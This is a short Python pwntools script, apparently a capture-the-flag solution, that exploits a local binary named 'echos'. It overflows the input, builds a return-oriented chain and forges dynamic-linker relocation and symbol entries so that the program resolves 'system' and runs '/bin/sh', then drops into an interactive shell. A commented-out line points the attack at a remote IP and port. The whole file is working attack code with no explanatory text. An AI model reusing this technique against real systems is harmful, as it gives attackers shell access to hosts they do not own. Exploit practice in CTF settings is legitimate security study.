from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
def pwn(p):
    #gdb.attach(p)
    p.recvuntil('enter the size:')
    payload = str(0xc40)
    payload = payload.ljust(8, '\x00')
    # 0x00000000004013c3 : pop rdi ; ret
    payload += flat([0x00000000004013c3, 0x404000 - 0x100])
    payload += p64(0x40103B)
    payload += p64(0x25b) # idx
    payload += p64(0xdeadbeffdeadbeff) # retaddr


    p.sendline(payload)
    p.recvuntil('size is ')
    p.recvuntil('\n')
    payload = p64(0xdeadbeffdeadbeff) # atoi got
    payload += p64(0x4013BC) # scanf got
    payload = payload.ljust(0xb40, 'b')
    payload += '/bin/sh\x00'
    payload += '\x00'*8
    payload += p64(0x4033C0) + p32(0x7) + p32(0x282) + p64(0)
    payload += '\x00'*8
    payload += p32(15024) + p32(0x12) + p64(0) + p64(0)
    payload += 'system\x00'
    payload = payload.ljust(0xc40, 'a')
    #payload += '\n'
    #payload += 'a'*0x5000
    p.send(payload)
    sleep(1)
    p.sendline('')
    p.interactive()

if __name__ == '__main__':
    p = process('./echos')
    #p = remote('172.81.214.122', 6666)
    pwn(p)